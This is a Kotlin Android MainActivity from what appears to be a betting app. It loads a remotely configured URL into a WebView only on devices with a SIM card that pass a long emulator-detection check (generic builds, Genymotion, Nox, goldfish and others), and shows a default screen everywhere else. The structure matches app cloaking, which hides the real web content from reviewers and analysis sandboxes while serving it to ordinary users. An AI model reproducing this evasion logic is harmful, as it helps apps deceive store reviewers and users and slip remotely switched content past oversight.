package ersecboom.bet.kof.presentation

import android.content.Context
import android.os.Build
import android.os.Bundle
import android.telephony.TelephonyManager
import androidx.appcompat.app.AppCompatActivity
import androidx.viewbinding.ViewBinding
import ersecboom.bet.kof.BuildConfig
import ersecboom.bet.kof.R
import ersecboom.bet.kof.databinding.ActivityMainBinding
import java.util.*


class MainActivity : AppCompatActivity() {

    private lateinit var binding: ViewBinding
    private lateinit var remoteConfigUtil: RemoteConfigUtil
    private val sharedPreferences by lazy {
        application.getSharedPreferences(STORAGE_NAME, Context.MODE_PRIVATE)
    }
    private var path: String? = null


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        launchLoadingScreen()
        remoteConfigUtil = (application as AdsApp).remoteConfigUtil
        path = getString()
        start()
    }

    private fun launchLoadingScreen() {
        supportFragmentManager.beginTransaction()
            .replace(R.id.main_container, LoadingFragment.newInstance())
            .commit()
    }

    private fun start() {
        if (path.isNullOrEmpty()) {
            setFetchCompleteObserver()
        } else {
            path?.let {
                launchWebViewFragment(it)
            }
        }
    }

    private fun fireLoad() {
        val getUrl = remoteConfigUtil.getUrl()
        val isSim = checkIsSimAvailable()
        if (getUrl.isEmpty() || checkIsEmu() || !isSim) {
            launchDefaultFragment()
        } else launchWebViewFragment(getUrl)
    }

    private fun checkIsSimAvailable(): Boolean {
        val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        return when (tm.simState) {
            TelephonyManager.SIM_STATE_ABSENT -> false
            else -> {
                true
            }
        }
    }

    private fun setFetchCompleteObserver() {
        remoteConfigUtil.remoteConfig.fetchAndActivate().addOnCompleteListener {
            fireLoad()
        }
    }

    private fun getString(): String? {
        return sharedPreferences.getString(RemoteConfigUtil.URL_KEY, null)
    }

    private fun launchDefaultFragment() {
        supportFragmentManager.beginTransaction()
            .replace(R.id.main_container, DefaultFragment.newInstance()).commit()
    }

    private fun launchWebViewFragment(url: String) {
        supportFragmentManager.beginTransaction()
            .replace(R.id.main_container, WebViewFragment.newInstance(url)).commit()
    }

    private fun checkIsEmu(): Boolean {
        if (BuildConfig.DEBUG) return false

        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE

        var result = (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.lowercase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware == "goldfish"
                || buildHardware == "vbox86"
                || buildProduct == "sdk"
                || buildProduct == "google_sdk"
                || buildProduct == "sdk_x86"
                || buildProduct == "vbox86p"
                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox")
                || buildHardware.lowercase(Locale.getDefault()).contains("nox")
                || buildProduct.lowercase(Locale.getDefault()).contains("nox"))

        if (result) return true
        result = result or (Build.BRAND.startsWith("generic")
                && Build.DEVICE.startsWith("generic"))
        if (result) return true
        result = result or ("google_sdk" == buildProduct)
        return result
    }


    companion object {
        const val STORAGE_NAME = "data"
    }
}